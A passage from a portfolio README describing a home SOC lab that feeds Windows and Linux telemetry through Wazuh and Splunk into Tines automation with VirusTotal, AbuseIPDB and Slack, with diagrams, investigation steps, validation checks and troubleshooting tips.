SOAR Automation
       |
       v
Threat Intelligence
       |
       v
Investigation
       |
       v
Response Recommendation
       |
       v
SOC Notification
```

The project provides practical evidence of skills in **SIEM administration, endpoint telemetry engineering, SPL detection development, security alert triage, threat intelligence enrichment, SOAR automation, and incident response**.

One technical point I deliberately changed: I would describe this as **"enterprise-style" or "enterprise-grade lab"** rather than "production-ready." A GitHub portfolio project using a controlled lab environment should distinguish demonstrated capabilities from a production deployment. This makes the repository more credible to a SOC hiring manager.


# 17. Splunk Universal Forwarder

The Windows endpoints also use Splunk Universal Forwarder to send telemetry to the Splunk server.

Typical event sources include:

* Security
* System
* Application
* PowerShell
* Sysmon

The telemetry flow is:

```text
Windows Endpoint
      |
      v
Splunk Universal Forwarder
      |
      v
Splunk Indexer
      |
      v
Splunk Enterprise
      |
      v
Search / Detection / Dashboard
```

This provides an additional investigation platform alongside Wazuh.

---

# 18. Kali Linux security testing

Kali Linux is used as the controlled attacker/test system.

**Host IP:** `192.168.10.10`
**NAT IP:** `192.168.169.134`
**Role:** Attacker / Security Testing

The purpose is to generate controlled activity against the Windows and Active Directory environment.

The testing workflow is:

```text
Kali Linux
     |
     v
Controlled Security Activity
     |
     v
Windows / Active Directory
     |
     v
Sysmon + Windows Events
     |
     v
Wazuh + Splunk
     |
     v
Detection
     |
     v
Investigation
```

This allows the lab to demonstrate a complete SOC investigation rather than simply collecting passive logs.

---



# 22. Tines automation workflow

The Tines workflow can automate:

```text
Alert Reception
       |
       v
IOC Extraction
       |
       +----------------+
       |                |
       v                v
 VirusTotal         AbuseIPDB
       |                |
       +--------+-------+
                |
                v
        Decision / Enrichment
                |
                v
              Slack
```

---

# 23. VirusTotal enrichment

VirusTotal can be used to investigate supported indicators such as file hashes.

Workflow:

```text
Wazuh Alert
     |
     v
Extract File Hash
     |
     v
VirusTotal Lookup
     |
     v
Return Reputation
```

The result can be added to the security notification sent to the SOC channel.

---

# 24. AbuseIPDB enrichment

AbuseIPDB can be used to investigate IP-based indicators.

Workflow:

```text
Wazuh Alert
     |
     v
Extract Source IP
     |
     v
AbuseIPDB Lookup
     |
     v
Return IP Reputation
```

The resulting reputation information can be passed to the final Tines decision or Slack notification.

---

# 25. Slack notification

After enrichment, Tines can send the security event to a Slack security channel.

Example notification:

```text
Security Alert

Alert:
Suspicious Windows Activity

Host:
MYDFIR-Windows

Rule:
100101

Severity:
10

IOC:
<indicator>

VirusTotal:
<reputation>

AbuseIPDB:
<reputation>

MITRE ATT&CK:
T1078
```

This gives the analyst useful context without requiring every enrichment step to be performed manually.

---

# 26. End-to-end detection workflow

The complete detection and response workflow is:

```text
                    KALI LINUX
                         |
                         v
                Controlled Activity
                         |
                         v
                  Windows / AD
                         |
             +-----------+-----------+
             |                       |
             v                       v
           Sysmon              Windows Security
             |                       |
             +-----------+-----------+
                         |
             +-----------+-----------+
             |                       |
             v                       v
          Wazuh                   Splunk
          Agent                     UF
             |                       |
             v                       v
       Wazuh Manager          Splunk Indexer
             |                       |
             v                       v
       Wazuh Indexer          Splunk Enterprise
             |
             v
       Detection Rules
             |
             v
          Wazuh Alert
             |
             v
         Tines SOAR
             |
        +----+------+
        |           |
        v           v
   VirusTotal   AbuseIPDB
        |           |
        +----+------+
             |
             v
           Slack
             |
             v
       SOC Investigation
```

---

# 27. SOC investigation workflow

## Step 1: Identify the alert

Start with the Wazuh alert.

Review:

* Rule ID
* Severity
* Timestamp
* Agent
* Hostname
* Description
* MITRE ATT&CK

## Step 2: Identify the endpoint

Determine:

* Hostname
* Username
* Source IP
* Destination IP
* Process
* Command Line
* Timestamp

## Step 3: Investigate process activity

Review Sysmon information:

* Image
* CommandLine
* ParentImage
* User
* ProcessId
* Hashes

## Step 4: Search surrounding activity

Use Wazuh archives and Splunk to investigate events before and after the alert.

## Step 5: Enrich indicators

Use Tines to perform:

```text
Hash -> VirusTotal
IP   -> AbuseIPDB
```

## Step 6: Determine severity

Consider:

```text
Detection
    +
Endpoint Context
    +
IOC Reputation
    +
MITRE ATT&CK
```

## Step 7: Notify

Tines sends the enriched alert to Slack.

---

# 28. Dashboards

Recommended Wazuh and Splunk dashboards include:

## Authentication

* Successful Logins
* Failed Logins
* Logon Types
* Authentication Failures
* Authentication Activity by Host

## Account activity

* User Account Creation
* User Account Deletion
* Account Modifications
* Privilege Changes

## Endpoint activity

* Process Creation
* Suspicious Command Execution
* PowerShell Activity
* Sysmon Events
* Network Connections

## File Integrity Monitoring

* File Creation
* File Modification
* File Deletion
* File Hash Changes

---

# 29. Validation and testing

## Wazuh server

```bash
sudo systemctl status wazuh-manager
sudo systemctl status wazuh-indexer
sudo systemctl status wazuh-dashboard
```

## Windows agent

```powershell
Get-Service Wazuh
```

## Linux agent

```bash
sudo systemctl status wazuh-agent
```

## Sysmon

Generate controlled activity:

```powershell
notepad.exe
```

Verify that Sysmon events appear in Wazuh and Splunk.

## FIM

Modify:

```text
C:\CompanyData\payroll.txt
```

Confirm that Wazuh detects the change.

## Custom detection

Generate the activity associated with the custom rule and verify that:

```text
Rule ID: 100101
```

appears in Wazuh.

## Tines

Trigger the configured Wazuh rule and verify:

```text
Wazuh
  |
  v
Tines
  |
  +--> VirusTotal
  |
  +--> AbuseIPDB
  |
  v
Slack
```

---

# 30. Troubleshooting

## Wazuh agent does not appear

Check the Windows service:

```powershell
Get-Service Wazuh
```

Verify:

* Wazuh agent is running.
* Wazuh Manager IP is correct.
* Network connectivity exists.
* The agent is registered with the manager.

Manager address:

```text
192.168.169.135
```

---

## No Sysmon events

Verify:

* Sysmon is installed.
* Sysmon is running.
* Sysmon event channel is enabled.
* `ossec.conf` is correctly configured.
* Wazuh agent has been restarted.
* Events are being generated.

Check:

```text
Microsoft-Windows-Sysmon/Operational
```

---

## FIM events are missing

Verify:

```xml
<directories realtime="yes">C:\CompanyData\</directories>
```

Restart:

```powershell
Restart-Service Wazuh
```

Modify the monitored file again.

---

## Custom Wazuh rule does not trigger

Check:

* Parent Rule ID
* Event fields
* Rule XML syntax
* Event decoder
* Event generated by the endpoint
* Rule level

Restart the Wazuh manager after configuration changes:

```bash
sudo systemctl restart wazuh-manager
```

---

## Tines integration does not trigger

Check:

```bash
sudo tail -f /var/ossec/logs/ossec.log
```

Verify:

* Integration name
* Integration script
* Tines webhook URL
* Rule ID
* Custom rule
* Wazuh manager status
* JSON payload

The configured rule must actually generate a Wazuh alert before the integration can be triggered.

---

# 31. Skills demonstrated

This project demonstrates practical experience with:

* SIEM deployment
* XDR architecture
* Active Directory security monitoring
* Windows security monitoring
* Linux security monitoring
* Sysmon
* Windows Event Logs
* Splunk Enterprise
* Splunk Universal Forwarder
* Wazuh
* Wazuh agents
* File Integrity Monitoring
* Custom detection engineering
* MITRE ATT&CK mapping
* Alert investigation
* Threat intelligence enrichment
* VirusTotal
* AbuseIPDB
* SOAR automation
* Tines
* Webhook integrations
* JSON alert processing
* Slack security notifications
* Security dashboards
* Log analysis
* Controlled attack simulation

---

# 32. Project outcome

The completed lab provides an end-to-end security monitoring and automation environment.

```text
                       ENDPOINTS
                           |
             +-------------+-------------+
             |                           |
          WINDOWS                      LINUX
             |                           |
          Sysmon                    Wazuh Agent
             |                           |
             +-------------+-------------+
                           |
                           v
                  WAZUH SIEM / XDR
                           |
                    Detection Rules
                           |
                           v
                      WAZUH ALERT
                           |
                           v
                       TINES SOAR
                           |
             +-------------+-------------+
             |             |             |
             v             v             v
        VirusTotal     AbuseIPDB       Slack
```

The lab demonstrates the complete security monitoring lifecycle:

```text
Endpoint Telemetry
       |
       v
Centralized Collection
       |
       v
Detection Engineering
       |
       v
Security Alert
       |
       v
Investigation
       |
       v
Threat Intelligence
       |
       v
SOAR Automation
       |
       v
Security Notification
```

---

# 33. Final architecture

```text
                          INTERNET
                              |
                              v
                         TINES SOAR
                      /       |       \
                     /        |        \
                    v         v         v
              VirusTotal  AbuseIPDB   Slack
                    ^         ^
                    |         |
                    +---- Tines
                         |
                    JSON Webhook
                         |
                         v
                  WAZUH SIEM / XDR
                   /             \
                  /               \
           Detection             Archives
              |                    |
              v                    v
        Security Alert        Raw Telemetry
              |
              v
        Tines Automation
              |
              v
       Threat Intelligence
              |
              v
        Analyst Notification
```

### Internal lab network

```text
       +--------------------------------------+
       |          INTERNAL LAB NETWORK        |
       |             192.168.10.0/24         |
       +--------------------------------------+

                  +----------------+
                  | Ubuntu Server  |
                  | 192.168.10.40  |
                  +--------+-------+
                           |
                     +-----+-----+
                     |           |
                  Splunk       Wazuh
                Enterprise    Manager
                     |           |
                  Indexer      Indexer
                                 |
                              Dashboard
                                 |
          +----------------------+------------------+
          |                      |                  |
          v                      v                  v
        FD-PC1                 DP-PC1              DC
    192.168.10.30          192.168.10.20      192.168.10.50
          |                      |                  |
       Sysmon                 Sysmon           Active Directory
       Wazuh                  Wazuh                  DNS
       Splunk UF              Splunk UF            Security
          |                      |                  |
          +----------------------+------------------+
                                 |
                                 v
                         Security Telemetry
```

### Kali Linux testing path

```text
                    KALI LINUX
                   192.168.10.10
                         |
                         v
                 Controlled Testing
                         |
                         v
                   Windows / AD
                         |
                         v
                   SIEM Detection
```

---

# 34. Conclusion

This project demonstrates a practical enterprise SOC architecture using open-source and commercial security technologies.

The environment covers the complete workflow from endpoint telemetry collection to centralized monitoring, detection engineering, investigation, threat intelligence enrichment, SOAR automation, and security notification.

The combination of:

```text
Active Directory
      +
Windows / Linux
      +
Sysmon
      +
Wazuh
      +
Splunk
      +
MITRE ATT&CK
      +
Tines
      +
Threat Intelligence
      +
Slack
```

creates a realistic security operations lab suitable for practicing SOC monitoring, detection engineering, incident investigation, SIEM administration, and SOAR automation.

---

## Project architecture image

The repository should contain the architecture image alongside this README:

```text
repository/
|
+-- README.md
|
+-- AD_Splunk_Wazuh_SOAR.jpg
|
+-- screenshots/
|
+-- wazuh/
|
+-- splunk/
|
+-- tines/
|
+-- detection-rules/
|
+-- documentation/
|
+-- lab-notes/
```

## Technologies

```text
Active Directory
Windows Server
Windows 11
Ubuntu
Kali Linux
Wazuh
Splunk
Sysmon
Tines
VirusTotal
AbuseIPDB
Slack
MITRE ATT&CK
SIEM
SOAR
XDR
FIM
```





